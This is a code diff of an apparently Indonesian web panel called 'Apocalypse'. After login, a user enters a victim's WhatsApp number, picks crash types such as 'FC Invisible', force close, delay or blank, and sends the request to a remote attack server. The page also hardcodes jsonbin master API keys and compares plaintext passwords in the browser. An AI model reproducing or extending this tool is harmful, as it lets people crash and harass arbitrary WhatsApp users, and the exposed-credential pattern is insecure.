@@ -31,19 +31,18 @@
     .status i { color: #ffffff; margin-right: 5px; }
     h1 { font-size: 1.4rem; color: var(--main); margin-bottom: 20px; text-align: center; animation: neon 2s infinite alternate; }
     .neon {
-  color: #0ff;
-  text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 20px #0ff;
-  animation: flicker 1.5s infinite alternate;
-}
-
-@keyframes flicker {
-  0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
-    opacity: 1;
-  }
-  20%, 24%, 55% {
-    opacity: 0.4;
-  }
-}
+      color: #0ff;
+      text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 20px #0ff;
+      animation: flicker 1.5s infinite alternate;
+    }
+    @keyframes flicker {
+      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+        opacity: 1;
+      }
+      20%, 24%, 55% {
+        opacity: 0.4;
+      }
+    }
     @keyframes neon { from { text-shadow: 0 0 10px var(--main); } to { text-shadow: 0 0 25px var(--second); } }
     input {
       background: rgba(255, 255, 255, 0.05);
@@ -107,57 +106,21 @@
     .small-logout:hover {
       background: rgba(255, 255, 255, 0.2);
     }
-    #popup {
-  position: fixed;
-  top: 0; left: 0; width: 100%; height: 100%;
-  background: rgba(0, 0, 0, 0.6);
-  display: flex; justify-content: center; align-items: center;
-  z-index: 999;
-}
-.popup-content {
-  background: #1a1a1a;
-  color: #00ff88;
-  padding: 30px;
-  border-radius: 15px;
-  text-align: center;
-  max-width: 90%;
-  box-shadow: 0 0 20px #00ff88;
-  animation: fadeIn 0.3s ease-in-out;
-  position: relative;
-}
-
-.popup-content .close-btn {
-  position: absolute;
-  top: 10px; right: 15px;
-  font-size: 1.5rem;
-  color: #ff4d4d;
-  cursor: pointer;
-}
-
-@keyframes fadeIn {
-  from { opacity: 0; transform: scale(0.9); }
-  to { opacity: 1; transform: scale(1); }
-}
   </style>
 </head>
 <body>
 <div id="particles-js"></div>
-<div id="popup" style="display:none;">
-  <div class="popup-content">
-    <span class="close-btn" onclick="closePopup()">&times;</span>
-    <p id="popup-message"></p>
-  </div>
-</div>
 
+<!-- Login Box -->
 <div id="login-box" class="glass-box">
   <h2>Welcome To Server Xzut</h2>
-  
   <input type="text" id="username" placeholder="Username" />
-  <input type="text"id="password" placeholder="Password"/>
-  <button onclick="login()"><i class="fas fa-sign-in-alt"></i>masuk</button>
+  <input type="text" id="password" placeholder="Password"/>
+  <button onclick="login()"><i class="fas fa-sign-in-alt"></i> Masuk</button>
   <div id="login-result" style="margin-top:10px; text-align:center;"></div>
 </div>
 
+<!-- Dashboard -->
 <div class="glass-box" id="main-box" style="display:none;">
   <div class="profile">
     <img src="https://files.catbox.moe/oeqk8v.png" alt="profile">
@@ -167,158 +130,155 @@
     </div>
   </div>
   <h1 class="neon"><i class="fab fa-whatsapp"></i> Apocalypse</h1>
+  <button class="small-logout" onclick="logout()">Logout</button>
+  <button class="small-logout" onclick="showBugPanel()"><i class="fas fa-virus"></i> Masuk ke Halaman Bug</button>
+</div>
+
+<!-- Bug Panel -->
+<div class="glass-box" id="bug-box" style="display:none;">
+  <h2 style="text-align:center; margin-bottom: 20px;">Panel Bug</h2>
   <input type="text" id="target" placeholder="628xxxx" />
-<div class="bug-options">
-  <div class="bug-card active" data-bug="crashtotal">
-    <i class="fas fa-skull-crossbones"></i><span>FC Invisible</span>
-  </div>
-  <div class="bug-card" data-bug="fc">
-    <i class="fas fa-bomb"></i><span>kontol WA</span>
-  </div>
-  <div class="bug-card" data-bug="delay">
-    <i class="fas fa-clock"></i><span>bangke Delay</span>
-  </div>
-  <div class="bug-card" data-bug="blank">
-    <i class="fas fa-eye-slash"></i><span>mmk WhatsApp</span>
+  <div class="bug-options">
+    <div class="bug-card active" data-bug="crashtotal">
+      <i class="fas fa-skull-crossbones"></i><span>FC Invisible</span>
+    </div>
+    <div class="bug-card" data-bug="fc">
+      <i class="fas fa-bomb"></i><span>kontol WA</span>
+    </div>
+    <div class="bug-card" data-bug="delay">
+      <i class="fas fa-clock"></i><span>bangke Delay</span>
+    </div>
+    <div class="bug-card" data-bug="blank">
+      <i class="fas fa-eye-slash"></i><span>mmk WhatsApp</span>
+    </div>
   </div>
   <button id="sendBtn" onclick="sendBug()"><i class="fas fa-bug"></i> Kirim Bug</button>
-  <button class="small-logout" onclick="logout()">Logout</button>
-
+  <button class="small-logout" onclick="showDashboard()">⬅️ Kembali ke Dashboard</button>
   <div id="result" style="margin-top:10px;"></div>
-  <div class="contact" style="margin-top: 20px; color: white;">
-    <p>Contact Developer:</p>
-    <a href="https://t.me/leakvjs" target="_blank" style="color: #00acee; text-decoration: none;">
-      <i class="fab fa-telegram"></i> @axpaw O`vovTzmxv
-    </a>
-  </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
 <script>
-particlesJS("particles-js", {
-  particles: {
-    number: { value: 60, density: { enable: true, value_area: 800 }},
-    color: { value: "#ffffff" },
-    shape: { type: "circle" },
-    opacity: { value: 0.4 },
-    size: { value: 3, random: true },
-    line_linked: {
-      enable: true, distance: 150,
-      color: "#ffffff", opacity: 0.3, width: 1
+  particlesJS("particles-js", {
+    particles: {
+      number: { value: 60, density: { enable: true, value_area: 800 }},
+      color: { value: "#ffffff" },
+      shape: { type: "circle" },
+      opacity: { value: 0.4 },
+      size: { value: 3, random: true },
+      line_linked: {
+        enable: true, distance: 150,
+        color: "#ffffff", opacity: 0.3, width: 1
+      },
+      move: { enable: true, speed: 2, direction: "none", random: false }
     },
-    move: { enable: true, speed: 2, direction: "none", random: false }
-  },
-  interactivity: {
-    events: {
-      onhover: { enable: true, mode: "grab" },
-      onclick: { enable: false }
+    interactivity: {
+      events: {
+        onhover: { enable: true, mode: "grab" },
+        onclick: { enable: false }
+      },
+      modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
     },
-    modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
-  },
-  retina_detect: true
-});
-
-const BIN_ID = "686ba9fa8a456b7966bcc574";
-const API_KEY = "$2a$10$MPw.J50xKE.i.HBKKPWYieKzmUQYvM/4hLOy3cYHSFcVEL8Yo08W";
-const headers = {
-  "Content-Type": "application/json",
-  "X-Master-Key": API_KEY
-};
-
-async function getUsers() {
-  const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
-  const data = await res.json();
-  return data.record;
-}
-
-function logout() {
-  sessionStorage.removeItem("currentUser");
-  location.reload();
-}
-
-function saveSession(user) {
-  sessionStorage.setItem("currentUser", JSON.stringify(user));
-}
-
-function getSession() {
-  return JSON.parse(sessionStorage.getItem("currentUser"));
-}
-
-window.onload = async () => {
-  const user = getSession();
-  if (user) showDashboard(user);
-};
-
-function showPopup(message) {
-  document.getElementById("popup-message").innerHTML = message;
-  document.getElementById("popup").style.display = "flex";
-}
-
-function closePopup() {
-  document.getElementById("popup").style.display = "none";
-}
-
-async function login() {
-  const user = document.getElementById("username").value.trim();
-  const pass = document.getElementById("password").value.trim();
-  const result = document.getElementById("login-result");
-  const users = await getUsers();
-  const found = users.find(u => u.username === user && u.password === pass);
-
-  if (found) {
-    saveSession(found);
-    showDashboard(found);
-  } else {
-    result.innerText = "❌ Username atau Password salah!";
-    result.style.color = "crimson";
-  }
-}
-
-function showDashboard(user) {
-  document.getElementById("login-box").style.display = "none";
-  document.getElementById("main-box").style.display = "block";
-  document.getElementById("userLabel").innerText = user.username;
-}
-
-let selectedBug = "crashtotal";
-document.querySelectorAll(".bug-card").forEach(card => {
-  card.addEventListener("click", () => {
-    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
-    card.classList.add("active");
-    selectedBug = card.getAttribute("data-bug");
+    retina_detect: true
   });
-});
 
-async function sendBug() {
-  const input = document.getElementById("target").value.trim();
-  const resDiv = document.getElementById("result");
-  const btn = document.getElementById("sendBtn");
+  const BIN_ID = "687cbac11d840042fcc2f90c";
+  const API_KEY = "$2a$10$cJpv0byOwaQrz9guKNyNY.XMRrGGrCg5Tz/uvMepxHSjcmVCGgYt6";
+  const headers = {
+    "Content-Type": "application/json",
+    "X-Master-Key": API_KEY
+  };
 
-  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
-    resDiv.innerText = "Masukkan nomor WA yang valid!";
-    resDiv.style.color = "crimson";
-    return;
+  async function getUsers() {
+    const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
+    const data = await res.json();
+    return data.record;
   }
 
-  const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
-  btn.disabled = true;
-  const originalHTML = btn.innerHTML;
-  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
-  resDiv.innerText = "";
+  function logout() {
+    sessionStorage.removeItem("currentUser");
+    location.reload();
+  }
 
-try {
-  const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
-  const json = await res.json();
+  function saveSession(user) {
+    sessionStorage.setItem("currentUser", JSON.stringify(user));
+  }
 
-  showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);
-} catch (err) {
-  resDiv.innerText = "❌ Gagal fetch: " + err;
-  resDiv.style.color = "crimson";
-}
+  function getSession() {
+    return JSON.parse(sessionStorage.getItem("currentUser"));
+  }
 
-  btn.disabled = false;
-  btn.innerHTML = originalHTML;
-}
+  window.onload = async () => {
+    const user = getSession();
+    if (user) showDashboard(user);
+  };
+
+  async function login() {
+    const user = document.getElementById("username").value.trim();
+    const pass = document.getElementById("password").value.trim();
+    const result = document.getElementById("login-result");
+    const users = await getUsers();
+    const found = users.find(u => u.username === user && u.password === pass);
+
+    if (found) {
+      saveSession(found);
+      showDashboard(found);
+    } else {
+      result.innerText = "❌ Username atau Password salah!";
+      result.style.color = "crimson";
+    }
+  }
+
+  function showDashboard(user) {
+    document.getElementById("login-box").style.display = "none";
+    document.getElementById("main-box").style.display = "block";
+    document.getElementById("bug-box").style.display = "none";
+    document.getElementById("userLabel").innerText = user.username;
+  }
+
+  function showBugPanel() {
+    document.getElementById("main-box").style.display = "none";
+    document.getElementById("bug-box").style.display = "block";
+  }
+
+  let selectedBug = "crashtotal";
+  document.querySelectorAll(".bug-card").forEach(card => {
+    card.addEventListener("click", () => {
+      document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
+      card.classList.add("active");
+      selectedBug = card.getAttribute("data-bug");
+    });
+  });
+
+  async function sendBug() {
+    const input = document.getElementById("target").value.trim();
+    const resDiv = document.getElementById("result");
+    const btn = document.getElementById("sendBtn");
+
+    if (!/^\d+$/.test(input)) {
+      resDiv.innerText = "Masukkan nomor WA yang valid!";
+      resDiv.style.color = "crimson";
+      return;
+    }
+
+    const chatId = input + "@s.whatsapp.net";
+    btn.disabled = true;
+    btn.innerText = "Mengirim...";
+    resDiv.innerText = "";
+
+    try {
+      const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
+      const json = await res.json();
+      resDiv.innerText = "✅ Bug berhasil dikirim ke " + input;
+      resDiv.style.color = "lime";
+    } catch (err) {
+      resDiv.innerText = "❌ Gagal: " + err;
+      resDiv.style.color = "crimson";
+    }
+
+    btn.disabled = false;
+    btn.innerText = "Kirim Bug";
+  }
 </script>
 </body>
 </html>
